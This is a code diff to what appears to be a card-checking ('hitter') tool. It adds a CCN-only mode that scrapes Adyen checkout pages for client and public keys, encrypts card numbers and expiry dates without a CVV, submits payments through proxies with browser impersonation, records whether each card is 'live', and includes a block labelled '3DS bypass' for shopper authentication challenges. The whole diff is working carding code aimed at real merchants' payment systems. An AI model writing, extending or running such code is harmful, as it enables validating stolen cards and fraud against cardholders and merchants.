@@ -96,6 +96,15 @@ class AdyenCSE:
             "encryptedSecurityCode":   self._encrypt_field("cvc",         cvv),
         }
 
+    def encrypt_card_ccn(self, number: str, month: str, year: str) -> dict:
+        """Encrypt card for CCN check — number + expiry only, no CVV."""
+        yr = year if len(year) == 4 else f"20{year}"
+        return {
+            "encryptedCardNumber":     self._encrypt_field("number",      number),
+            "encryptedExpiryMonth":    self._encrypt_field("expiryMonth", month.zfill(2)),
+            "encryptedExpiryYear":     self._encrypt_field("expiryYear",  yr),
+        }
+
 
 # ═══════════════════════════════════════════════════════════════════════════
 #  Regex Helpers & Config Extractor
@@ -841,6 +850,118 @@ class AdyenHitter:
     # ════════════════════════════════════════════════════════════════════════
     #  PUBLIC
     # ════════════════════════════════════════════════════════════════════════
+    async def hit_ccn(self, card: dict, attempt: int, user_id: int) -> dict:
+        """CCN-only hit: encrypts card number + auto-generated expiry, no CVV."""
+        t0 = time.time()
+        result = dict(
+            attempt=attempt, card=card, success=False,
+            decline_code=None, response_time=0,
+            merchant='Adyen Merchant', proxy_raw=None,
+            error=None, raw_response=None, is_live=False, psp=None,
+            ccn_mode=True,
+        )
+
+        proxies = None
+        if self.proxy_data:
+            result['proxy_raw'] = self.proxy_data.get('raw')
+            auth = (f"{self.proxy_data['username']}:{self.proxy_data['password']}@"
+                    if 'username' in self.proxy_data else "")
+            purl = f"http://{auth}{self.proxy_data['server'].replace('http://', '')}"
+            proxies = {"http": purl, "https": purl}
+
+        try:
+            async with ChromeSession(impersonate="chrome131",
+                                     proxies=proxies, timeout=7) as sess:
+
+                cfg = await self._scrape(sess)
+                result['merchant'] = cfg.get('merchant', 'Adyen Merchant')
+                if cfg.get('amount_value') is not None:
+                    val = cfg['amount_value']
+                    cur = cfg.get('amount_currency', 'USD')
+                    result['amount'] = f"{cur} {val / 100:.2f}"
+
+                if not cfg.get('adyen'):
+                    result['error'] = "No Adyen checkout detected on this page"
+                    result['decline_code'] = 'no_adyen'
+                    result['response_time'] = round(time.time() - t0, 2)
+                    return result
+
+                ck = cfg.get('clientKey')
+                if not ck:
+                    result['error'] = "Adyen detected but clientKey not found"
+                    result['decline_code'] = 'no_client_key'
+                    result['response_time'] = round(time.time() - t0, 2)
+                    return result
+
+                env = cfg.get('environment', 'live')
+
+                pk = cfg.get('publicKey')
+                if not pk:
+                    pk = await self._fetch_pubkey(sess, ck, env)
+                if not pk:
+                    result['error'] = f"Cannot fetch pubkey for {ck[:20]}…"
+                    result['decline_code'] = 'no_pubkey'
+                    result['response_time'] = round(time.time() - t0, 2)
+                    return result
+
+                # CSE encrypt — CCN mode: number + expiry only, no CVV
+                try:
+                    cse = AdyenCSE(pk)
+                    enc = cse.encrypt_card_ccn(
+                        card['card'], card['month'], card['year'])
+                except Exception as e:
+                    result['error'] = f"CSE failed: {e}"
+                    result['decline_code'] = 'cse_error'
+                    result['response_time'] = round(time.time() - t0, 2)
+                    return result
+
+                sid   = cfg.get('sessionId')
+                sdata = cfg.get('sessionData')
+                result['pbl_reusable'] = cfg.get('pbl_reusable', True)
+
+                if (not sid or not sdata) and cfg.get('pbl_status') and cfg['pbl_status'] not in ('active', 'open', 'paymentPending'):
+                    result['error'] = f"Pay by Link is {cfg['pbl_status']}"
+                    result['decline_code'] = 'link_' + str(cfg['pbl_status']).lower()
+                    result['response_time'] = round(time.time() - t0, 2)
+                    return result
+
+                if sid and sdata:
+                    data = await self._pay_session(
+                        sess, enc, sid, sdata, ck, env,
+                        att_id=cfg.get('checkoutAttemptId'))
+                else:
+                    data = await self._pay_direct(sess, enc, ck, env)
+
+                if not data:
+                    result['error'] = "Adyen session missing — dynamic session required"
+                    result['decline_code'] = 'no_session'
+                    result['response_time'] = round(time.time() - t0, 2)
+                    return result
+
+                # 3DS bypass
+                rc = data.get('resultCode', '')
+                if rc in ('IdentifyShopper', 'ChallengeShopper', 'RedirectShopper'):
+                    result['3ds_attempted'] = True
+                    result['3ds_type'] = rc
+                    if sid and sdata:
+                        resolved = await self._resolve_3ds(
+                            sess, data, sid,
+                            data.get('sessionData', sdata),
+                            ck, env)
+                        if resolved and resolved is not data:
+                            data = resolved
+                            result['3ds_resolved'] = True
+
+                result['response_time'] = round(time.time() - t0, 2)
+                result['raw_response'] = data
+                return self._parse(data, result)
+
+        except Exception as ex:
+            result['response_time'] = round(time.time() - t0, 2)
+            result['decline_code'] = 'exception'
+            result['error'] = str(ex)[:150]
+            return result
+
     async def hit(self, card: dict, attempt: int, user_id: int) -> dict:
         t0 = time.time()
         result = dict(
